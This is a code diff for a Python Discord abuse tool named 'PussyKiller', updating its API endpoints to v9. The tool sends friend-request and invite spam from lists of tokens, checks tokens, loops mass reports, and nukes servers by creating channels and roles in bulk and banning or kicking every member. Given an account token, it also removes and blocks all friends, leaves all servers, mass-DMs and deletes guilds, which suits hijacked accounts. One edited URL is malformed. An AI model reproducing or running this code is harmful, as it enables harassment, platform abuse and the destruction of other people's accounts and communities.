@@ -55,6 +55,8 @@ import websocket
 from os import system
 
 
+
+ur = 'https://discord.com/api/v9/channels/messages'
 title = 'PussyKiller'
 system(f'title {title}')
 
@@ -211,7 +213,7 @@ def spammer():
                     "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
                 }
                 payload = {"username": user[0], "discriminator": user[1]}
-                src = requests.post('https://canary.discordapp.com/api/v6/users/@me/relationships', headers=headers,
+                src = requests.post('https://discord.com/api/v9/users/@me/relationships', headers=headers,
                                     json=payload)
                 if src.status_code == 204:
                     print(f"{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}Friend request sent to {user[0]}#{user[1]}!")
@@ -245,7 +247,7 @@ def spammer():
             token = token.replace("\r", "")
             token = token.replace("\n", "")
             headers = {
-                ":authority": "canary.discord.com",
+                ":authority": "discord.com",
                 ":method": "POST",
                 ":path": "/api/v9/invites/" + invite,
                 ":scheme": "https",
@@ -357,7 +359,7 @@ def spammer():
     if choice == 7:
 
         def checker(token):
-            response = post(f'https://discord.com/api/v6/invite/{randint(1, 9999999)}',
+            response = post(f'https://discord.com/api/v9/invite/{randint(1, 9999999)}',
                             headers={'Authorization': token})
             if "You need to verify your account in order to perform this action." in str(
                     response.content) or "401: Unauthorized" in str(response.content):
@@ -414,7 +416,7 @@ def spammer():
 
         tokeen = input("Token: ")
         headers = {'Authorization': tokeen, 'Content-Type': 'application/json'}
-        r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
+        r = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
         if r.status_code == 200:
             pass
         else:
@@ -445,7 +447,7 @@ def spammer():
 
             while True:
                 sent = 0
-                r = requests.post('https://discord.com/api/v6/report', headers=headers, json=payload)
+                r = requests.post('https://discord.com/api/v9/report', headers=headers, json=payload)
                 if r.status_code == 201:
                     print(f"{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Sent Report{Fore.RESET}")
                     sent += 1
@@ -523,7 +525,7 @@ def spammer():
             emoji = ej.emojize(org, use_aliases=True)
             if start == '':
                 a = requests.put(
-                    f"https://discordapp.com/api/v6/channels/{chd}/messages/{iddd}/reactions/{emoji}/@me",
+                    f"https://discordapp.com/api/v9/channels/{chd}/messages/{iddd}/reactions/{emoji}/@me",
                     headers=headers)
                 if a.status_code == 204:
                     print(f"{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Reaction {org} added! ")
@@ -588,7 +590,7 @@ def spammer():
                     def SpamChannels(self, guild, name):
                         while True:
                             json = {'name': name, 'type': 0}
-                            r = requests.post(f'https://discord.com/api/v8/guilds/{guild}/channels', headers=headerrs,
+                            r = requests.post(f'https://discord.com/api/v9/guilds/{guild}/channels', headers=headerrs,
                                               json=json)
                             if 'retry_after' in r.text:
                                 time.sleep(r.json()['retry_after'])
@@ -602,7 +604,7 @@ def spammer():
                     def SpamRoles(self, guild, name):
                         while True:
                             json = {'name': name}
-                            r = requests.post(f'https://discord.com/api/v8/guilds/{guild}/roles', headers=headerrs,
+                            r = requests.post(f'https://discord.com/api/v9/guilds/{guild}/roles', headers=headerrs,
                                               json=json)
                             if 'retry_after' in r.text:
                                 time.sleep(r.json()['retry_after'])
@@ -676,7 +678,7 @@ def spammer():
 
                     def BanMembers(self, guild, member):
                         while True:
-                            r = requests.put(f"https://discord.com/api/v8/guilds/{guild}/bans/{member}",
+                            r = requests.put(f"https://discord.com/api/v9/guilds/{guild}/bans/{member}",
                                              headers=headerrss)
                             if 'retry_after' in r.text:
                                 time.sleep(r.json()['retry_after'])
@@ -689,7 +691,7 @@ def spammer():
 
                     def KickMembers(self, guild, member):
                         while True:
-                            r = requests.delete(f"https://discord.com/api/v8/guilds/{guild}/members/{member}",
+                            r = requests.delete(f"https://discord.com/api/v9/guilds/{guild}/members/{member}",
                                                 headers=headerrss)
                             if 'retry_after' in r.text:
                                 time.sleep(r.json()['retry_after'])
@@ -910,8 +912,7 @@ def spammer():
 
 
     if choice == 12:
-        print('')
-        tokenn = input("Token: ")
+        tokenn = input("Account Token: ")
 
         print(f'''{Fore.LIGHTMAGENTA_EX}[1]{Fore.RESET} Server spam
 {Fore.LIGHTMAGENTA_EX}[2]{Fore.RESET} Remove all friends
@@ -933,17 +934,17 @@ def spammer():
             for count, i in enumerate(range(0, 25)):
                 payload = {"name": generate_random_string(15)}
                 spam_server_request = requests.post(
-                    "https://canary.discord.com/api/v8/guilds", headers=headers, json=payload
+                    "https://discord.com/api/v9/guilds", headers=headers, json=payload
                 )
 
         def remove_friends(Token):
             headers = {"authorization": Token, "user-agent": "bruh6/9"}
             remove_friends_request = requests.get(
-                "https://canary.discord.com/api/v8/users/@me/relationships", headers=headers
+                "https://.discord.com/api/v9/users/@me/relationships", headers=headers
             ).json()
             for i in remove_friends_request:
                 requests.delete(
-                    f"https://canary.discord.com/api/v8/users/@me/relationships/{i['id']}",
+                    f"https://discord.com/api/v9/users/@me/relationships/{i['id']}",
                     headers=headers,
                 )
                 print(f"{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}Removed Friend {i['id']}")
@@ -952,11 +953,11 @@ def spammer():
             headers = {"authorization": Token, "user-agent": "bruh6/9"}
             json = {"type": 2}
             block_friends_request = requests.get(
-                "https://canary.discord.com/api/v8/users/@me/relationships", headers=headers
+                "https://discord.com/api/v9/users/@me/relationships", headers=headers
             ).json()
             for i in block_friends_request:
                 requests.put(
-                    f"https://canary.discord.com/api/v8/users/@me/relationships/{i['id']}",
+                    f"https://discord.com/api/v9/users/@me/relationships/{i['id']}",
                     headers=headers,
                     json=json,
                 )
@@ -1000,11 +1001,11 @@ def spammer():
         def server_leave(Token):
             headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
             leave_all_servers_request = requests.get(
-                "https://canary.discord.com/api/v8/users/@me/guilds", headers=headers
+                "https://discord.com/api/v9/users/@me/guilds", headers=headers
             ).json()
             for guild in leave_all_servers_request:
                 requests.delete(
-                    f"https://canary.discord.com/api/v8/users/@me/guilds/{guild['id']}",
+                    f"https://discord.com/api/v9/users/@me/guilds/{guild['id']}",
                     headers=headers,
                 )
                 print(f"{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}Left Guild: {guild['id']}")
@@ -1012,24 +1013,24 @@ def spammer():
         def dms_close(Token):
             headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
             close_dm_request = requests.get(
-                "https://canary.discord.com/api/v8/users/@me/channels", headers=headers
+                "https://discord.com/api/v9/users/@me/channels", headers=headers
             ).json()
             for channel in close_dm_request:
                 requests.delete(
-                    f"https://canary.discord.com/api/v8/channels/{channel['id']}",
+                    f"https://discord.com/api/v9/channels/{channel['id']}",
                     headers=headers,
                 )
 
         def mass_dm(Token):
             headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
             mass_dm_request = requests.get(
-                "https://canary.discord.com/api/v8/users/@me/channels", headers=headers
+                "https://discord.com/api/v9/users/@me/channels", headers=headers
             ).json()
             for channel in mass_dm_request:
                 json = {"content": input('Message: ')}
                 time.sleep(1)
                 r = requests.post(
-                    f"https://canary.discord.com/api/v8/channels/{channel['id']}/messages",
+                    f"https://discord.com/api/v8/channels/{channel['id']}/messages",
                     headers=headers,
                     data=json,
                 )
@@ -1043,7 +1044,7 @@ def spammer():
             ).json()
             for i in delete_personal_request:
                 requests.post(
-                    f"https://canary.discord.com/api/v9/guilds/{i['id']}/delete",
+                    f"https://discord.com/api/v9/guilds/{i['id']}/delete",
                     headers=headers,
                 )
                 print(i["id"])
